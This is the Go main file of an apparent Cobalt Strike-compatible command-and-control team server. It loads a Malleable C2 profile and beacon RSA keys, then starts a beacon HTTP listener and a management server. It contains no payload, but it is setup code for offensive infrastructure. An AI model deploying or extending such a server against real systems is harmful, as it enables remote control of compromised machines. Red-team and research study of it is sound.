package main

import (
	"NewCsTeamServer/client"
	"NewCsTeamServer/config"
	"NewCsTeamServer/profile"
	"NewCsTeamServer/server/http"
	"NewCsTeamServer/server/manager"
	"NewCsTeamServer/utils"
	"flag"
	"fmt"
	"github.com/kataras/golog"
	_ "go.uber.org/automaxprocs"
	"os"
)

var (
	ProfileName string //读取适配profile
	BeaconKey   string //读取原版cs生成的rsa公私钥
)

func init() {
	flag.StringVar(&ProfileName, "profile", "jquery-c2.4.5.profile", "Load Your Profile")
	flag.StringVar(&BeaconKey, "i", ".cobaltstrike.beacon_keys", "like -i .cobaltstrike.beacon_keys")
	flag.Parse()
	utils.GetRsaKey(BeaconKey) //读取原版cs生成的rsa公私钥
	GetProfile()

}
func GetProfile() error { //TODO 粗略写了个解析profile的方案，后续完善和增加对rsa公私钥的读取解析
	data, err := os.Open(ProfileName)
	if err != nil {
		fmt.Println("[info]", "Not Find Profile!")
		return nil
	}
	infos := profile.GetProfile(data)
	fmt.Println("--------------------------------------------------------------------")
	fmt.Println("Profile Name:", ProfileName)
	fmt.Println("Profile GetUrl:", infos.HttpGet.Url)
	fmt.Println("Profile OutPutAppendLen:", infos.HttpGet.OutPutAppendLen) //后续agent处理，直接过滤掉这个长度的字符串即可
	fmt.Println("Profile OutPutPrependLen:", infos.HttpGet.OutPutPrependLen)
	fmt.Println("Profile MetadataType:", infos.HttpGet.MetadataType)
	fmt.Println("Profile CookieName:", infos.HttpGet.MetadataTypeValue)
	fmt.Println("Profile PostUrl:", infos.HttpPost.Url)
	fmt.Println("Profile Post:", infos.HttpPost)
	fmt.Println("--------------------------------------------------------------------")
	config.ProfileConfig = config.Profile{ //TODO 读取profile适配，现已有方案，增加对应的加解密函数
		CookieName:  infos.HttpGet.MetadataTypeValue,
		GetUrl:      infos.HttpGet.Url,
		GetRetBody:  "This is a Test",
		PostUrl:     infos.HttpPost.Url,
		PostQuery:   infos.HttpPost.ClientOutputTypeValue,
		PostRetBody: "Task received successfully",
	}
	return nil
}
func main() {
	golog.Println(config.ProfileConfig)
	client.GlobalClientManager = client.NewClientManager()
	go http.HttpServer("8081", false)    //TODO 后续通过监听器，监听指定端口
	manager.RunTeamServer("8088", false) //管理端服务 TODO 后续使用websocket或其他方式进行通信
}
